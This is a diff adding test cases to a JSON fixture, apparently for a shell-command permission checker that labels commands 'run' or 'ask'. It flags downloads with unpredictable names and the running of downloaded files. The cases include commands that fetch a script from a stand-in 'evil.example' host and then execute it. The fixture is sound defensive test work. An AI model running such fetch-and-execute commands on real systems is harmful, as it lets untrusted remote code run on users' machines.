@@ -16175,6 +16175,145 @@
   {
    "cmd": "mysql app -e 'select source from t'",
    "verdict": "run"
+  },
+  {
+   "cmd": "wget $URL",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "curl -sLO \"$U\"",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "curl -O \"https://example.com/$NAME\"",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "curl --remote-name-all $(cat urls.txt)",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "xargs -n1 curl -sO < urls.txt",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "parallel curl -sO < urls.txt",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "aria2c \"$U\"",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "curl -O 'https://example.com/file[1-3].sh'",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "http -d https://evil.example/a.py",
+   "verdict": "ask",
+   "rules": [
+    "download.unnamed"
+   ]
+  },
+  {
+   "cmd": "git clone $REPO",
+   "verdict": "run"
+  },
+  {
+   "cmd": "wget \"$BASE/data.csv\"",
+   "verdict": "run"
+  },
+  {
+   "cmd": "wget -x https://example.com/dir/a.py",
+   "verdict": "run"
+  },
+  {
+   "cmd": "cd y && make",
+   "downloaded": [
+    "/home/ana/proj/\u0000\u0000"
+   ],
+   "verdict": "ask",
+   "rules": [
+    "escape.run-downloaded"
+   ]
+  },
+  {
+   "cmd": "bash run.sh",
+   "downloaded": [
+    "/home/ana/proj/\u0000\u0000"
+   ],
+   "verdict": "ask",
+   "rules": [
+    "escape.run-downloaded"
+   ]
+  },
+  {
+   "cmd": "node .",
+   "downloaded": [
+    "/home/ana/proj/index.js"
+   ],
+   "verdict": "ask",
+   "rules": [
+    "escape.run-downloaded"
+   ]
+  },
+  {
+   "cmd": "python3 .",
+   "downloaded": [
+    "/home/ana/proj/__main__.py"
+   ],
+   "verdict": "ask",
+   "rules": [
+    "escape.run-downloaded"
+   ]
+  },
+  {
+   "cmd": "python3 evil.example/dir/a.py",
+   "downloaded": [
+    "/home/ana/proj/evil.example/dir/a.py"
+   ],
+   "verdict": "ask",
+   "rules": [
+    "escape.run-downloaded"
+   ]
+  },
+  {
+   "cmd": "python3 analyze.py",
+   "downloaded": [
+    "/home/ana/proj/data.csv"
+   ],
+   "verdict": "run"
+  },
+  {
+   "cmd": "node .",
+   "downloaded": [
+    "/home/ana/proj/data.json"
+   ],
+   "verdict": "run"
   }
  ]
 }
